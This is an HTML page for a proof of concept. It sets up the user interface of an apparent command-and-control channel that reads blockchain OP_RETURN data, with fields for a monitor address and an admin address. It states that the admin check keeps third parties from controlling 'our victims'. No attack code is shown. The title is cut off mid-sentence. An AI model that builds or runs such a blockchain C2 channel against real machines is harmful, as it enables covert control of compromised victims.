<h1>This is a PoC on how to use the blockchain to </h1>
<p>You will have to configure the following parameters: the <b>monitor address</b> and the <b>admin address</b>. Although both can be the same, they are different: </p>
<ul>
    <li>
        The <b>monitor address</b> is the address whose transactions will be checked in search of a valid <code>OP_RETURN</code> code.
        <br>
        Monitor address:
        <input type="text" id="textMonitorAddress" value="mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB"/>
    </li>
    <li>
        The <b>admin address</b> is the address of the admin. Only transactions sent by this address will be considered valid commands. This verification has been included to prevent third parties from controlling our victims.
        <br>
        Admin address:
        <input type="text" id="textAdminAddress" value="mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB"/>
    </li>
</ul>

<br>
<button id="clickMe" onclick="checkServer()" /> Do whatever asked by the admin!</button>
